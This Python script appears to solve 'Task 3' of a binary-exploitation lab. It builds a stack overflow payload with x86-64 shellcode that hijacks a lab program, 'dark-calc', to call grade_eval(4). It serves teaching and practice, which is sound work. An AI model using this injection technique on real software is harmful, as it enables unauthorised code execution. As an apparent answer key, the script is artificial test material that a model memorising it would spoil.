#!/usr/bin/env python3
"""Task 3: execute shellcode on dark-calc's stack to call grade_eval(4)."""
import struct
import sys
BUFFER = 0x721000800FD0
GRADE_EVAL = 0x401A87
shellcode = bytes.fromhex(
    "bf 04 00 00 00"
    "48 b8 87 1a 40 00 00 00 00 00"
    "ff d0"
    "c3"
)
payload = shellcode + b"A" * (0x18 - len(shellcode)) + struct.pack("<Q", BUFFER)
assert len(payload) == 0x20
assert b"\n" not in payload
sys.stdout.buffer.write(payload)